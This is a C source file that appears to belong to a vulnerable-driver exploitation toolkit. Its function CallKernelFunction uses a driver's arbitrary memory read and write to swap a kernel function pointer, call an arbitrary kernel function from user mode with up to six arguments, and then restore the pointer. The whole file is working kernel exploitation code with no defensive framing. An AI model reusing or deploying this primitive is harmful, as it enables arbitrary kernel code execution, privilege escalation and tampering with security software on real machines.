#include "vuln.h"
#include "utils/utils.h"
#include "driver/driver_loader.h"
#include "driver/driver_interface.h"


typedef uintptr_t(*func6_t)(uintptr_t, uintptr_t, uintptr_t, uintptr_t, uintptr_t, uintptr_t);

bool CallKernelFunction(
	DriverState* driverState,
	uintptr_t faddress,
	uintptr_t* return_out, size_t args_count, uintptr_t* args
)
{
	if((driverState->swap_ref == 0) || (driverState->swap_u == 0))
		return false;

	uintptr_t orig_swap_ptr = 0;
	if (!ReadMemory(driverState, driverState->swap_ref, &orig_swap_ptr, sizeof(uintptr_t)))
		return false;

	if (!WriteMemory(driverState, driverState->swap_ref, &faddress, sizeof(uintptr_t)))
		return false;

	static uintptr_t dummy_ret = 0;
	if (return_out == NULL)
		return_out = &dummy_ret;

	func6_t ufunc = (func6_t)(driverState->swap_u);
	*return_out = ufunc(
		args_count >= 1 ? args[0] : 0,
		args_count >= 2 ? args[1] : 0,
		args_count >= 3 ? args[2] : 0,
		args_count >= 4 ? args[3] : 0,
		args_count >= 5 ? args[4] : 0,
		args_count >= 6 ? args[5] : 0
	);

	return WriteMemory(driverState, driverState->swap_ref, &orig_swap_ptr, sizeof(uintptr_t));
}